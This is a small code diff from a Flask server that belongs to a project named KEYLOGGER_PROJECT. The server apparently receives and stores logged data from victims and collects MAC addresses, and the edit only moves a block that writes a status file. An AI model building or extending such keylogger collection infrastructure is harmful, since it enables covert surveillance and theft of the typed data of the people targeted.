@@ -8,6 +8,11 @@ from getmac import get_mac_address
 from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 
 
+
+with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
+    json.dump({'flask':True}, f)
+
+
 app = Flask(__name__)
 CORS(app)
 
@@ -37,9 +42,6 @@ def add_data():
         f.write(data)
         return jsonify({'post':'successful','if exit':'False'}), 200
 
-
-with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
-    json.dump({'flask':True}, f)
 
 @app.route('/send_mac', methods=['POST'])
 def send_mac():
